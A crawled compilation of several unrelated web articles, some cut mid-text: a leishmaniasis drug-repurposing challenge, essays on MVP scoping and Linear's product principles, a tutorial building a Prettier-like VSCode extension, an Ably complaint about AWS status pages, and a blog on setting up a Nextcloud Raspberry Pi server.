<p>Visceral leishmaniasis causes swelling, malaise, wasting, damages spleen and liver, as well as leads to characteristic graying of skin (hence the name <em>black fever</em>). The fever caused by the disease lasts for more than two weeks and does not abate with antimalarial drugs. The cutaneous type makes for wide-spread sores that can take over a year to heal, and lead to necrosis (dying of tissue). It leads to scars on the face, neck, arms and legs. The third, mucocutaneous type causes both skin and mucosal ulcers, leading to the damage of soft tissues and cartilage, predominantly of nose and mouth area. All types tend to co-occur with AIDS (approximately 1 in 60 AIDS patients in south of France suffers from leishmaniasis).</p>

Was earlier  treated and cured for visceral leishmaniasis. Libo Kemkem district,  Ethiopia.  Source: WHO<br></figcaption></figure>
<p> The treatment for visceral leishmaniasis is problematic and relies mostly on antibiotics, which have a variable success rate. The most commonly used non-antibiotic drugs, containing pentavalent antimony (such as sodium stibogluconate or meglumine antimonate) are toxic to the heart, kidneys, pancreas and bone marrow of the patient, leading to headaches, abdominal issues, vomiting and low levels of blood platelets. They also require a month-long treatment through injections, as medication does not work well if taken by mouth. There is no safe treatment for cutaneous leishmaniasis, that would work dependably, with fluconazole (an antifungal medication) and pentamidine (an antimicrobial used for other kinetoplastid diseases) being the most promising support medications. Miltefosine, the first promising oral treatment for visceral leishmaniasis, tends to be effective for cutaneous form, but has limited use, as it is known to cause birth defects. </p>
<p>In the recent years a massive drug discovery campaign has led to discovery of a new drug (codenamed GNF6702) and its analog (a new, improved version, named NITD689), which affect parasites ability to degrade unnecessary and damaged proteins. While these drugs seem to work against a wide range of pathogens (including these causing African sleeping sickness, Chagas disease and visceral leishmaniasis), they are not effective against the other leishmaniases. Additionally, there is an emerging mutation among the parasites, that already now renders the drug ineffective. Therefore, even though it is currently successful in the clinical trials, it will most likely not lead to the eradication of the disease.&nbsp;  </p>
<p>There is a dire need for a new, safe therapy for kinetoplastis, one that can be administered earlier, with lesser likelihood of bothersome side effects, one that could eradicate these diseases once and for all. Finding this therapy is the goal of this Indaba Grand Challenge, and literally lives are at stake. The approach to identify potential cure candidates is drug repurposing. </p>
<h2>What is Drug Repurposing?</h2>
<figure><img src="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg" alt="" srcset="https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing.jpg 910w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-300x198.jpg 300w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-768x508.jpg 768w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-85x56.jpg 85w, https://deeplearningindaba.com/wp-content/uploads/2020/05/drug-repurposing-234x155.jpg 234w" sizes="(max-width: 910px) 100vw, 910px"><figcaption>Photo Credit: pixabay.com</figcaption></figure>
<p>Drug repurposing is the act of researching if an existing drug can be used for new therapeutic purposes. It’s something that has been done for centuries. A large amount of medications on the market right now are used for multiple purposes: for instance, aspirin is a pain reliever and also a blood thinner, ibuprofen is also used for pain relief, and for reducing inflammations.</p>
<p>The high cost of research and development involved in finding new drugs means that most of these will be targeted to “First World” countries to generate returns.</p>
<p>For “neglected diseases” or “tropical diseases”, drug repurposing is used as a sort of universal strategy: it lowers the costs of research and production and the time needed for clinic trials, which is why you’ll find that many of these diseases use medication that was originally used for other illnesses.</p>
<h2>The Challenge </h2>
<p>Drug discovery methods and pipelines are well described and modular. Each can be decomposed into smaller pieces, which can be rearranged and modified. All of these pipelines rely heavily on knowledge representation, pattern detection and building of statistical models.</p>
<p>The goal of this Indaba Grand Challenge is to, through the use of standard techniques and publicly available data on drugs, drug targets and kinetoplastids (parasites causing amongst other leishmaniasis), identify either:</p>
<ul>
<li>Compounds among known, approved drugs which can target known drug targets in <em>Leishmania </em>(especially one of the 15 species known to cause the cutaneous type of disease)<em> </em>in addition to their official use.</li>
<li>Compounds among known, approved drugs with sufficiently similar targets in the goal organisms to the targets in kinetoplastids.</li>
</ul>
<p>Importantly, the verification of a drug-target interaction is possible and routinely done <em>in silico</em>. However, not all drug-target combinations can be verified, due to sheer combinatorial expansion and limited computational resources. In addition, the identification of similarities and analogies between known experimental data is far from trivial and, despite the existence of numerous approaches, cannot be solved by one statistical technique alone.</p>
<p>By launching this Grand Challenge, and true to the core values of Deep Learning Indaba, we aim to build a <strong>collaborative effort</strong>, joining experts and enthusiasts in machine learning and software engineering, with doctors, epidemiologists, medicinal chemists and policy experts, to create a <strong>synergistic effect at scale</strong>. Our vision, if it becomes true, is one where interesting discoveries of the community are taken up by the experts, and conclusions of the experts are fed back to the community to iteratively improve on its findings and make breakthroughs possible. <strong>No single person can do it perfectly, but through a joint effort, together we can. </strong></p>
<h2> Challenge Specs </h2>
<p><strong>Goal:</strong> Propose a new treatment, comprising an <em>Leishmania </em>protein (either from a defined species, or a protein present in the proteome of one or more of the <em>Leishmania </em>species) and a small molecule (or set of small molecules). Submission can be specified as:</p>
<ul>
<li>Small molecule (SMILES/SMARTS string or SDF file) and a protein name</li>
<li>PDB file with a structure of a target and a bound small molecule</li>
</ul>
<p><strong>Available resources: </strong>We have put together a list of available resources and additional material <a rel="noreferrer noopener" aria-label=" (opens in a new tab)" href="https://deeplearningindaba.com/grand-challenges/leishmaniasis/resources/" target="_blank">here</a>.</p>

The issue has to do with how new features and new products are defined. Regardless of the client’s experience building digital products, SaaS, mobile apps, web apps, the majority generally tend to screw this up. As a Product Design Consultant, I haven’t worked on one feature where I didn’t have to provide clarity to strip down and simplify the scope. The real issue is that the client tends to give little thought to the product scope (amount and complexity of features) for the first version and how it feeds into the second version, through user feedback and analytics data, and how that feeds into the third version. Whatever you think your Minimal Viable Product is, can be stripped much further down.</p><p>I have a few theories as to why clients make this mistake.&nbsp;</p><ul data-rte-list="default"><li><p>They’re too passionate and excited about the new feature or product, so there is a lot of attachment to the final product vision, which makes for emotional decision making</p></li><li><p>They have a really grand vision and they *think they’ve stripped down the scope to the core, when they haven’t</p></li><li><p>They think they have to build everything because of a bureaucratic reason</p></li><li><p>They think the user won’t like the feature or product, because the real value is in the combination of all of those features being in one place</p></li></ul><p>This mistake is important because building too much, too fast, will create a larger time frame between their starting point and their point of receiving positive feedback from users (qualitative feedback, product market fit, user analytics data or some KPI). This larger gap will lead to them running out of resources faster, whether it’s funding, or psychological motivation to continue.</p><p>I will use a couple of examples based on real clients I’ve worked with to explain my theory and how to go about the thinking.&nbsp;</p><p>1- The client was building a SaaS analytics dashboard for an enterprise use case. As with any data visualization dashboard, giving the user the ability to see an overview snapshot of data to answer their underlying business question is the primary goal, and the secondary goal is for them to dig deeper into specific data points to further uncover information that will guide their business decisions. The first step is to build the primary overview dashboard with the snapshot 30,000 ft view of the data and optimize that in the first version, then focusing on iterations. The second step is to build the deep dive views. If there is no interaction with the overview of the data because it’s deemed not interesting enough, because it’s answering the wrong business questions that the user doesn’t actually care about, then the deep dive views don’t matter, the user won’t try to dive deep into something irrelevant. The way to measure the interaction with the snapshot view of the data without having built the deep dive views was to allow click actions into that overview data, but just provide static deep dives, rather than fancy interactive deep dives that lead to more deep dives. In short, the secondary view, which in this case was the analytics deep dives, had to be stripped down a lot.</p><p>2- The client was building a social application. “We need the ability for users to comment, and for other users to respond to these comments via text, voice, and video.” If the initial user doesn’t comment, the corresponding feature of text, voice and video is utterly useless and literally unusable in the UI. So we built the initial comments section, measured the interaction using an analytics tool, or sometimes manually tracked what percentage of users left the initial comment. The idea was that if that percentage is high enough, we would continue with the rest of the product hypothesis, if it’s low, rethink the initial comment.</p><p>In short, design the core, core-core, like the actual core. Then strip it down further, and build it. And measure it, optimize it. And once it reaches a certain level, then you can start to build the rest, otherwise “the rest” will never be used, and won’t be given a fair chance to be measured.</p></div></div></div></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>VSCode has become a staple for many developers local environment. One of the reasons is the powerful extensions which can be run from within the IDE itself, from type checking to code auto formatting. Here we will take a look at an overview of VSCode and then dig into how the auto formatting works. The final task will be to build a small version of Prettier (or eslint --fix) which can run as a VSCode extension. The goal is to understand the mechanics at work inside this kind of extension and some key differences with other types of extensions.</p>

<p>The article today will be broken down into 3 parts:</p>
<ol>
<li><a href="#1-electron">Electron</a></li>
<li><a href="#2-vscode-extensions">VSCode extensions</a></li>
<li><a href="#3-our-own-prettier-extension">Our own Prettier extension</a></li>
</ol>
<hr>

<p>Under the hood VSCode is built with Electron. Electron is a software framework which allows for the development of desktop GUI applications using web technologies. It combines the Chromium rendering engine and the Node.js runtime. It was recently added to the <a href="https://openjsf.org/projects/">OpenJS Foundation</a>.</p>
<p>There are 2 types of processes inside Electron</p>
<ol>
<li>
<p>Main process</p>
<ul>
<li>only 1 run at a time</li>
<li>job to handle all the <em>Renderers</em></li>
</ul>
</li>
<li>
<p>Renderer process</p>
<ul>
<li>many running at once</li>
<li>represents a page with UI</li>
<li>job to run code</li>
</ul>
</li>
</ol>
<p>A basic example of creating a new node process (renderer) is a below.</p>
<div data-language="javascript"><pre><code><span>let</span> <span>{</span> fork <span>}</span> <span>=</span> <span>require</span><span>(</span><span>"child_process"</span><span>)</span>
<span>let</span> serverProcess <span>=</span> <span>fork</span><span>(</span>__dirname <span>+</span> <span>"/server.js"</span><span>)</span></code></pre></div>
<p>Messages are sent across processes via IPC (inter-process communication), this enables rendrer-to-renderer communication, bypassing the main process. The GUI's are Chromium web pages.</p>
<hr>

<p>VSCode has extensions which introduce more advanced functionality. As it is built with Electron it must conform to the process rules.</p>
<p>In VSCode all extensions run in a single <em>Renderer process</em> called the "extension host process" (process name <code>shared-process</code>, in task manager they are under <code>Code helper (renderer)</code>).</p>
<p>There seem to be 2 main types of VSCode extensions:</p>
<ol>
<li>The extension host proccess does all the work</li>
<li>
<p>The extension host process runs a "client" whose job is to spawn a "server" <em>Renderer process</em>, which will do most of the heavy lifting. The server communicates with the client.</p>
<ul>
<li>this is common for a Language Server</li>
<li>it is worth noting that only the "extension host process" can update the GUI.</li>
</ul>
<blockquote>
<p>You can see which process is running what task via the VSCode Process Explorer (CMD Palette "<em>Developer: Open Process Explorer</em>")</p>
</blockquote>
</li>
</ol>
<h2 id="type-2---language-servers"><a href="#type-2---language-servers" aria-label="type 2   language servers permalink"></a>Type 2 - Language Servers</h2>
<p>Language Servers are background tasks spawned by an extension for a specific purpose.</p>
<p>TypeScript and Eslint are both examples of extensions which run Language Servers for their compilers. This is so the "server" can do the majority amount of the processing in the background, and only needs to relay messages (e.g. diagnostics) to the "client". They are often configured to re-run on save. This produces a more performant "client". In general it is good practice to run linters under a Language Server.</p>
<p>There are several strong pros of using Language Servers:</p>
<ol>
<li>Persistent memory and caching - the server never dies so can maintain a cache in memory to perform faster compiles in future runs</li>
<li>Faster boot up times - the server is already running shrinking any boot-up wait time to practically 0.</li>
</ol>
<p>Finally it is worth noting that VSCode comes with its own <a href="https://microsoft.github.io/language-server-protocol/">"Language Server Protocol"</a> which makes the client/server communication easier. It is a JSON-RPC standard between the development tool and the language server.</p>
<p>See example architecture below.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/vscode-arch.png" alt="VSCode extension architecture"></p>
<p>There is a <a href="https://code.visualstudio.com/api/language-extensions/language-server-extension-guide">language server extension guide</a> available here. An extension must make use of <code>vscode-languageclient</code> to implement a language client and server.</p>
<h2 id="type-1---one-and-dones"><a href="#type-1---one-and-dones" aria-label="type 1   one and dones permalink"></a>Type 1 - "One-and-dones"</h2>
<p>For extensions which do not run a langauge server, a common term is "one-and-done".</p>
<p>Examples of this are Prettier and Mocha (non-watch mode). Where the extension/compiler runs once and then ends until it is called into action again, perhaps via a file save (assuming it respects your preference for <code>editor.formatOnSave</code>, which most extensions do).</p>
<p>They can be less performant than Langauge Server as no data or information is persisted and must run in its entirety each time. However:</p>
<ul>
<li>there is no complex communication required between server and client.</li>
<li>for something like Prettier which reformats the entire file, it would require sending a huge amount of data between the client and server, so doing it all on the main extension process in the long run might be more performant.</li>
</ul>
<hr>

<p>We are going to build a VSCode extension which will be a stripped down version of Prettier. It will run for 2 different scenarios.</p>
<h3 id="scenario-1"><a href="#scenario-1" aria-label="scenario 1 permalink"></a>Scenario 1</h3>
<h4 id="before"><a href="#before" aria-label="before permalink"></a>Before</h4>

<h4 id="after"><a href="#after" aria-label="after permalink"></a>After</h4>

<p>So for scenario 1 it will respect that no arguments are given and not change anything.</p>
<h3 id="scenario-2"><a href="#scenario-2" aria-label="scenario 2 permalink"></a>Scenario 2</h3>
<h4 id="before-1"><a href="#before-1" aria-label="before 1 permalink"></a>Before</h4>
<div data-language="javascript"><pre><code><span>myFunction</span><span>(</span>one<span>,</span> two<span>,</span> three<span>)</span></code></pre></div>
<h4 id="after-1"><a href="#after-1" aria-label="after 1 permalink"></a>After</h4>
<div data-language="text"><pre><code>myFunction(
  one,
  two,
  three
);</code></pre></div>
<p>So for scenario 2 it will recognise the arguments, format them correctly and update the code in our file.</p>
<h2 id="lets-get-started-"><a href="#lets-get-started-" aria-label="lets get started  permalink"></a>Lets get started 💪</h2>
<h3 id="1-json-setup"><a href="#1-json-setup" aria-label="1 json setup permalink"></a>1. JSON setup</h3>
<p>Add necessary setup to <code>package.json</code></p>
<div data-language="json"><pre><code>  <span>"main"</span><span>:</span> <span>"./src/extension"</span><span>,</span>
  <span>"publisher"</span><span>:</span> <span>"craig-vscode-extension"</span><span>,</span>
  <span>"activationEvents"</span><span>:</span> <span>[</span>
    <span>"onCommand:extension.SexifyIt"</span>

      <span>}</span>
    <span>]</span>
  <span>}</span><span>,</span></code></pre></div>
<p>This will</p>
<ul>
<li>tell VSCode the extension JavaScript can be found in <code>./src/extension</code></li>
<li>register our extension to run on activation (when it starts), see <code>activationEvents</code></li>
<li>tell VSCode to title our extension under <code>Sexify it</code> inside the VSCode command palette.</li>

<h3 id="2-build-a-basic-text-replacement-extension"><a href="#2-build-a-basic-text-replacement-extension" aria-label="2 build a basic text replacement extension permalink"></a>2. Build a basic text replacement extension</h3>
<p>Inside <code>src/extension.js</code> add the below.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/activation-code.png" alt="Extension activation code"></p>
<p>Lets walk through what it is doing</p>
<ul>
<li>line 2 register our extension <code>"extension.SexifyIt"</code></li>
<li>line 6 grabs the current active editor</li>
<li>line 9 grabs all the document text</li>
<li>line 10 grabs the range details for the current selected text (it needs a range for the <code>replace</code> function)</li>
<li>line 13 calls our processing and reprinting function returning the new code, more on that in a moment</li>
<li>line 16/17 replaces the current selected range with our newly formatted code</li>
</ul>
<h3 id="3-ast-processing-and-reprinting"><a href="#3-ast-processing-and-reprinting" aria-label="3 ast processing and reprinting permalink"></a>3. AST processing and reprinting</h3>
<p>Inside the same file we define some AST utilities.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/ast-utils.png" alt="AST utilities"></p>
<ul>
<li>line 2-5 are simple character utilities</li>
<li>line 6 is a small function for an "Expression" statement (e.g. <code>myFunction()</code>)</li>
<li>the <code>Statements</code> object contains functions for each AST node type, with knowledge of how to "reprint" them i.e. turn AST back into JavaScript. It contains an <code>ExpressionStatement</code> and a <code>CallExpression</code>, which is what we need for our scenarios.</li>
</ul>
<p>The bulk of the processing is on line 21-28.</p>
<ul>
<li>grab number of arguments in function - line 21</li>
<li>if not greater than 0 (line 22) return as is</li>
<li>else we add a line break (line 23) and process each argument (line 26)</li>
<li>
<p>details of line 26:</p>
<ul>
<li>add an "indent" then the "argument name"</li>
<li>check if it is last argument, if not add a coma followed by a line break, else just add line break</li>
</ul>
</li>
<li>finally on line 29 we return an array of all the strings</li>
</ul>
<p>Our function would output the following from the above:</p>
<p><code>["myFunction", "(", "\n", " one,\n", " two,\n", " three\n", ")"]</code></p>
<p>It contains all the necessary code including the updated formatting. Notice the line breaks and indents.</p>
<h4 id="finally-the-code-to-kick-it-off"><a href="#finally-the-code-to-kick-it-off" aria-label="finally the code to kick it off permalink"></a>Finally the code to kick it off</h4>
<p><img src="https://craigtaub.dev/images/auto-formatting/parse-reprint.png" alt="AST utilities"></p>
<ul>
<li>
<p>line 2 we convert out function string into an AST object</p>
<ul>
<li>using a 3rd party tool called <code>abstract-syntax-tree</code> for this</li>
</ul>
</li>
<li>
<p>line 4 we map over each item in the <code>body</code></p>
<ul>
<li>the <code>body</code> is an array of each "block" (sometimes a line, sometimes an entire function)</li>
</ul>
</li>
<li>we call the <code>Statements</code> function for that AST node type (i.e. here will be <code>CallExpression</code>)</li>
<li>lastly on line 5 and 6 we flatten the new array and rejoin it so it becomes a string again.</li>
</ul>
<h2 id="checking-it-works"><a href="#checking-it-works" aria-label="checking it works permalink"></a>Checking it works</h2>
<p>So by running our extension in debugger mode (i.e. F5) we can open a file with our JavaScript in (example in <code>files/test.js</code>), highlight the code, open the "Command Palette" and find our "Sexify it" extension.</p>
<p><img src="https://craigtaub.dev/images/auto-formatting/sexify-it.png" alt="Our extension"></p>
<p>It will turn...</p>
<div data-language="javascript"><pre><code><span>myFunction</span><span>(</span>one<span>,</span> two<span>,</span> three<span>)</span></code></pre></div>
<p>Into this</p>
<div data-language="text"><pre><code>myFunction(
  one,
  two,
  three
);</code></pre></div>
<p>Confirming it works 👍. Converts our single-line function into multi-line with all the correct indents, exactly like Prettier does.</p>

<p>Thanks so much for reading or watching, I learnt a huge amount about VSCode and auto formatters from this research and I hope it was useful for you. You can find the repository for all this code <a href="https://github.com/craigtaub/our-own-prettier">here</a>.</p>
<p>Thanks, Craig 😃</p></div></div>]]>

<p><strong><em>TL;DR: Don’t trust AWS status reports, they’re misleading</em></strong></p>
<p>This morning at 1:00am the reporting systems for <a href="https://ww.ably.io/platform" rel="noopener">our Ably realtime platform</a> notified us of a whole range of service failures for one of our customers in a dedicated realtime cluster in AWS’ Northern California datacenter (us-west-1).</p>
<p>We investigated and discovered network partitioning along with other severe network failures. We checked the AWS status dashboard for information — nothing, all green. 30 minutes later AWS finally posted a status update with this:</p>

However he visits the AWS status page and doubts our “truth” because quite rightly, he says everything is green. Here is what the status page looked like:</p>

<ul>
<li>
<strong>Amazon AWS flat out lies</strong> — considering a cloud based network accessible service to be “operating normally” when the network is not working is insane</li>
<li>
<strong>We cannot trust Amazon AWS status updates </strong>because the information provided to us about the severity of the issue or how quickly it will really be resolved</li>
</ul>
<p>We suspect if we had reached out to AWS in this post-truth world, this is what we would have got:</p>

    "></figure><h3 id="so-what-should-have-happened">So what should have happened</h3>
<p>Fortunately that’s pretty simple — what we require is honesty and we expect AWS to err on the side of caution.</p>
<p>Here’s what we did at <a href="https://www.ably.io/" rel="noopener">Ably</a> for our customers to notify them about what happened when we detected the fault:</p>
<ul>
<li>We had monitoring systems to tell us immediately there was a fault, which in turn created an incident automatically in <a href="https://status.ably.io/" rel="noopener">our status site</a> within minutes of the problems in us-west-1.</li>
<li>We then manually <a href="https://status.ably.io/incidents/377" rel="noopener">updated the incident on our status site</a> with our commentary and emailed everyone signed up for status updates with the issue and what we were doing about it (which was to route traffic away from the faulty datacenter).</li>
<li>We took an honest approach and weren’t worried to show a bit of orange on our status site. Because if something is not operating as expected, then we are pretty sure that is not classified as “operating normally” and at best should be classified as “performance issues”. See our status dashboard below:</li>

<h3 id="amazon-aws-you-can-and-should-do-better">Amazon AWS — you can and “should” do better</h3>
<p>Our plea to Amazon AWS is please don’t fall into this post-truth trap and aim to have false green in your status dashboard. Looking at your AWS status dashboard today, in spite of the fact that an entire datacenter was unusable for a few hours this morning, is completely green. See the screenshots: (<a href="https://dl.dropboxusercontent.com/u/1575409/Ably/blog/status-aws-amazon-today-1.png" rel="noopener">page 1</a>), (<a href="https://dl.dropboxusercontent.com/u/1575409/Ably/blog/status-aws-amazon-today-2.png" rel="noopener">page 2</a>) — there is so much green on the status page that we were unable to fit the screenshot in one image (max height of 30,000 pixel). Amazon, your AWS status page today has 38,000 vertical pixels of green!</p>
<p>We rely on AWS infrastructure to deliver our realtime data delivery platform. Amazon needs to take their downtime and issues more seriously, be more upfront about what’s going on, and not wait half an hour to report that a datacenter being offline is “operating normally”. It’s not like they don’t have resources that outstrip any other infrastructure provider, <a href="https://www.google.co.uk/search?%7Bgoogle:acceptedSuggestion%7Doq=amazon+hires+100%2C000+in+a+month&amp;sourceid=chrome&amp;ie=UTF-8&amp;q=amazon+hires+100%2C000+in+a+month&amp;gws_rd=ssl" rel="noopener">they’re hiring 100k employees in the next 18 months</a>.</p>
<p>Amazon AWS, we expect more of you. Please be honest.</p>

Quality of software is driven by both the talent of its creators and how they feel while theyâ€™re crafting it. Teams that have the time and energy to be focused on the work itself can build magical, high quality software. Our tools and practices need to do their best to nurture this, not take it away.</p><p>To bring back the right focus, these are the foundational ideas Linear is built on.</p></header><section><h2>Principles</h2><h3>Build for the creators</h3><p>Software project management tools should build with the end users â€“ the creators â€“ in mind. Keeping individuals productive is more important than generating perfect reports.</p><h3>Opinionated software</h3><p>Productivity software should be opinionated. It's the only way the product can truly do the heavy lifting for you. Flexible software lets everyone invent their own workflows, which eventually creates chaos as teams scale.</p><h3>Create momentum â€“ don't sprint</h3><p>We should find a cadence and routine of working. In cycles, we decide priorities and assign responsibilities. Our goal is to maintain a healthy momentum with our teams, not rush towards the end.</p><h3>Meaningful direction</h3><p>Our daily work might be filled with tasks but we should understand and remind our teams of the purpose and long term goals of our work. Roadmaps, projects and milestones are all important to keep in mind as we plan our weekly schedules.</p><h3>Aim for clarity</h3><p>Donâ€™t invent terms if possible, as these can confuse and have different meanings in different teams. Projects should be called projects.</p><h3>Say no to busy work</h3><p>Our tools should not make us the designers and maintainers of them. We should throw away or automate the busy work so you can focus on the more important work.</p><h3>Simple first, then powerful</h3><p>Teams at different sizes have different needs. Tools should be simple to get started with and grow more powerful over time.</p><h3>Decide and move on</h3><p>There isn't always a best answer. The important thing is to make a decision, and move on.</p></section><section><h2>Practices</h2><h3>Set monthly, quarterly or/and annual roadmaps</h3><p>Ambitious goals are the only way to make a significant impact. Companies should focus on them when they define their high level direction. Reserve some space on your roadmaps for unexpected and reactive work that always comes up and allow your roadmap to change if needed.</p><h3>Connect daily work to larger goals with projects</h3><p>All projects and work should directly correlate to these goals. Review projects and their target dates during roadmap meetings and pull from projects as you plan cycles.</p><h3>Work in <i>n-week</i> cycles</h3><p>Cycles create healthy routine and focus teams on what needs to happen next. 2-week cycles are the most common in software building. They're short enough to not lose sight of other priorities but long enough to build significant features. Cycles should feel reasonable. Don't overload cycles with tasks and let unfinished items move to the next cycle automatically.</p><h3>Keep a manageable backlog</h3><p>You don't need to save every feature request or piece of feedback. Important ones will resurface and low priority ones will never get fixed. A more focused backlog makes it easier and faster to plan cycles, and ensures the work will actually get done.</p><h3>Mix feature and quality work</h3><p>All software has bugs, more than we can ever fix. Include bugs and other fixes as part of your cycles. Invest in tooling as it is a force multiplier if done right.</p><h3>Specify project and issue owners</h3><p>Each project should have a named owner responsible to own delivery and write the project brief. The same goes for issues. Others should collaborate but responsibility should lie with a single person.</p><h3>Write project specs</h3><p>Aim for brevity. Short specs are more likely to be read. The purpose of a spec is to briefly communicate the "why", "what" and "how" of the project to the rest of the team. Ideally these short documents force teams to scope out work so priorities are clear and teams avoid building the wrong thing.</p><h3>Understand your users</h3><p>The more popular your product, the more feedback you'll get. Overflowing inboxes are a good sign unless they're bug reports. Donâ€™t worry too much about organizing all the feedback. Collect it and use it as a research library when developing new features. Try to spot trends. Use feedback, even complaints, as an opportunity to get to know your users and ask them to explain why they want a specific feature so you find out their needs. Solve the problem â€“ donâ€™t just build the feature.</p><h3>Scope issues to be as small as possible</h3><p>It's hard to see visible progress when working on large tasks, which can be demotivating. Break down work into smaller parts and create an issue for each one when possible. Ideally you can complete several concrete tasks each week. It feels great to mark issues as done.</p><h3>Measure progress with actual work</h3><p>The clearest way to see whether something is complete or not is to show the diff in the code or design file. When the tasks are scoped small, your changes will be small and easier to review, too. Avoid massive pull requests or large design changes.</p><h3>Run cross-functional teams</h3><p>Designers and engineers should work together on projects, creating a natural push and pull. Designers bring their skills to explore ideas and push your team's thinking. Engineers can challenge thinking around implementation and will bring the winning ideas to reality. The best creators often have talent for both. Directly loop in other teams when building features they'll use or ask customers they interact with to use.</p><h3>Write a changelog</h3><p>Itâ€™s important to look back and celebrate what you achieved as a team. Consistent changelogs also communicate to the user new features, the value they get from your product, and your commitment to improving it. It's also an easy way to connect your team's individual work to the collective value they create.<!-- --> <a href="https://medium.com/linear-app/startups-write-changelogs-c6a1d2ff4820">Read more</a> on how we write ours.</p></section></div></div>]]>

    <h3 id="why-am-i-doing-this-to-myself">Why am I doing this to myself?</h3>
<p>I really like taking notes. Notes are an extension of my stupid brain, which can’t remember a <em>damn</em> thing on its own. All these notes were being stored on Google’s servers, which <a href="https://en.wikipedia.org/wiki/PRISM_%28surveillance_program%29" target="_blank" rel="noreferrer noopener">didn’t</a> <a href="https://www.gnu.org/proprietary/malware-google.en.html" target="_blank" rel="noreferrer noopener">seem like</a> <a href="https://www.washingtonpost.com/technology/2019/06/21/google-chrome-has-become-surveillance-software-its-time-switch/" target="_blank" rel="noreferrer noopener">the best</a> <a href="https://www.eff.org/deeplinks/2020/03/google-says-it-doesnt-sell-your-data-heres-how-company-shares-monetizes-and" target="_blank" rel="noreferrer noopener">idea</a>. And it wasn’t just notes. Pictures, videos, miscellaneous files, I was giving it all to Google for free.</p>
<p>Since my notes contain <em>my bad ideas, and they are <strong>my</strong> bad ideas alone</em>, I wanted to take back control of my data. After researching ways to do such a thing (through the Google search engine of course), my best option seemed to be a <a href="https://nextcloud.com/" target="_blank" rel="noreferrer noopener">Nextcloud server</a>.</p>
<p>Nextcloud has all the niceties of a Google Drive or Dropbox, but you host it yourself on your own hardware, and no one’s allowed to snoop. This sounded great! This’ll be so easy! I’ll get this running in just a couple minutes!</p>
<p>Maybe you guessed it from the length of this article, but… this was not the case. Building and setting up this server was a nightmare hellhole, and I’m here today to share my hell with you, the reader, for free!</p>
<p>This isn’t so much a guide or tutorial - more just me explaining (and venting about) the massive effort it took to set this damn thing up. I hope somebody someday learns something from my suffering, or is maybe just entertained.</p>
<h3 id="the-hardware">The hardware</h3>
<p>I had been interested in doing <em>something, anything at all</em>, with a <a href="https://www.raspberrypi.org/" target="_blank" rel="noreferrer noopener">Raspberry Pi</a> for a while, so this was my excuse. Beyond that, I just followed <a href="https://magpi.raspberrypi.org/articles/build-a-raspberry-pi-nas" target="_blank" rel="noreferrer noopener">this great article from a Pi magazine</a> for my hardware choices. If you’re wondering what hardware I used, look there. I copied it exactly. Plus, c’mon, look how cute everything looks stacked up like that! A literal “stack”! Ha!</p>
<p><img src="https://acolannino.io/blog/how-i-struggled-to-build-a-nextcloud-server-and-won/nextbox.png" alt="nextbox"></p>
<p>One part the guide doesn’t explain very well was the “USB powered hub” - both why you need one, and what that actually is. Is it a hub powered by USB? A USB powered by a “hub”? What is a “hub”? Maybe it seems obvious to you, and maybe I was just sleep deprived at the time, but I was having trouble wrapping my smooth brain around this concept.</p>
<p>Turns out, the USB hub is simply needed to provide power to the two hard drives, rather than the power going to the Pi <em>and</em> the drives. I have no idea if this was really necessary, but it makes me feel 10% more confident my drives won’t crap out at any moment, and that helps me go to sleep at night.</p>
<h3 id="raid-1-or-whatever-that-means">RAID 1, or whatever that means</h3>
<p>Here I was, all ready to go in fulfilling my long-held dream of running my own little server. Then my stupid coworker comes in, and asks “hey, what if your drive fails? what will you do then?” and ruins all of my fun.</p>
<p>He tells me I should do “RAID”, which is apparently all the rage. RAID stands for “Redundant, Awesome… I dunno”, and was invented on a whim by <a href="https://en.wikipedia.org/wiki/RAID#History" target="_blank" rel="noreferrer noopener">some random nerds in the 80’s</a>. To attempt to give an actual explanation: Using a RAID 1 setup means you get data redundancy, as it will constantly mirror the drives. If one drive craps out, the other drive will still have all the same data, so you just replace the broken one and go about your day as normal. The downside of RAID 1 is you’re getting half the storage capacity that you paid for, but I figured 1 terabyte was large enough to store plenty of memes.</p>
<p>Setting up the RAID array was by far the most pain-free part of the process. Actually, it was the <em>only</em> pain-free part, the rest was pure suffering. I recommend doing this for fun if you’re bored on a Friday evening. It’s cathartic, and the only part of this whole thing that <a href="https://www.youtube.com/watch?v=nVqcxarP9J4" target="_blank" rel="noreferrer noopener">just worked</a>.</p>
<p>All I had to do was run some cute little commands from the guide, and I was golden. I didn’t fully understand the intricacies of everything I was doing, and the command-line interfaces for some of these programs were absolutely wild (press ‘n’ for a new partition, and ‘p’ for a “primary partition”? Really <code>fdisk</code>? Does this make you happy?), but other than that, it was all smooth sailing.</p>
<p>I should note - no one on the internet really cared to explain how a RAID setup should work with Nextcloud. Eventually I figured this out - the RAID array is seen by the OS as one device, so just politely ask Nextcloud to use that instead of the SD card. I ended up having to <a href="https://docs.nextcloud.com/server/latest/admin_manual/issues/general_troubleshooting.html#troubleshooting-data-directory" target="_blank" rel="noreferrer noopener">create a symlink from Nextcloud’s data directory to a directory on my RAID device</a>, but this wasn’t the worst thing I had to suffer through.</p>
<h3 id="big-pixel-energy-destroys-my-wifi">Big Pixel Energy destroys my WiFi</h3>
<p>So here I am, all proud and happy of my brand new Raspberry Pi running a fresh <del>Raspbian</del> Raspberry Pi OS. As I was setting up the RAID array, downloading lots of cute <a href="https://en.wikipedia.org/wiki/Unix_philosophy" target="_blank" rel="noreferrer noopener">UNIX-style utilities</a>, the WiFi starts to cut in-and-out. This has been a problem on my other main machines ever since I switched them to Linux, so I figured it was the <em>mysterious Intel WiFi+bluetooth death bug</em> plaguing me on yet another machine.</p>
